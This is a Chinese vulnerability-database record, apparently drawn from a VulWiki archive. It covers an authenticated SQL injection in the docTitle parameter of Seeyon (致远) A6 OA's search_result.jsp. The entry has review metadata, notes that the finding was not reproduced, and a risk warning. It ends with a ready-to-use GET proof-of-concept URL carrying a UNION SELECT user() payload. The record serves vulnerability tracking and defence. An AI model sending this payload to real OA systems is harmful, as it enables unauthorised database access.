---
source: "hatch 补库批 20260928"
title: "致远A6 search_result.jsp docTitle SQL注入"
product: "致远A6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A6；MySQL user()五列UNION"
prerequisites: "明确需登录账号"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20search_result.jsp%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-b8c2ca7109c7e7f771e29761"
entity_id: "ve-b8c2ca7109c7e7f771e29761"
schema_version: "1"
---

# 致远A6 search_result.jsp docTitle SQL注入

## 条目说明

- 对象与具体问题：致远A6；search_result.jsp docTitle SQL注入
- 版本、配置及部署条件：A6；MySQL user()五列UNION
- 认证与权限前提：明确需登录账号
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 关键鉴权前提明确，缺最低角色/补丁版本和响应
- POC URL含未编码中文/空格，应标浏览器示意而非原始HTTP
- 简介空白，无源链接，不能据单样本推RCE

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

二、漏洞影响
------------

致远OA A6

三、复现过程
------------

###### 漏洞位置:

    /yyoa/oaSearch/search_result.jsp

###### 漏洞详情:

    版本：A6
    注意：需登录账户
    注入发生在search_result.jsp文件中的docTitle参数

###### 请求方式:

    Get

###### POC:

    http://www.0-sec.org/yyoa/oaSearch/search_result.jsp?docType=协同信息&docTitle=1'and/**/1=2/**/ union/**/all/**/select/**/user(),2,3,4,5%23&goal=1&perId=0&startTime=&endTime=&keyword=&searchArea=notAr
